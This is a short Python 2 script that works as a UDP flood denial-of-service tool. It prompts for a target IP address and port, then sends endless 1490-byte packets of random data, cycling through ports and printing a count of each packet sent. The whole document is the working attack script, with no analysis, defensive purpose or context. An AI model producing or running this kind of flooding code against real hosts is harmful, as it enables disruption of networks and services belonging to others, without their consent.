import sys
import os
import time
import socket
import random
import datetime 
from datetime import datetime

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

ip = raw_input("IPA of your Target ===> ")
port = input("Port of your target  ===> ")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     time = str(datetime.now())
     print "[DATA] Sent %s packet to %s throught port:%s AT ==> %s"%(sent,ip,port,time)
     if port == 65534:
       port = 1
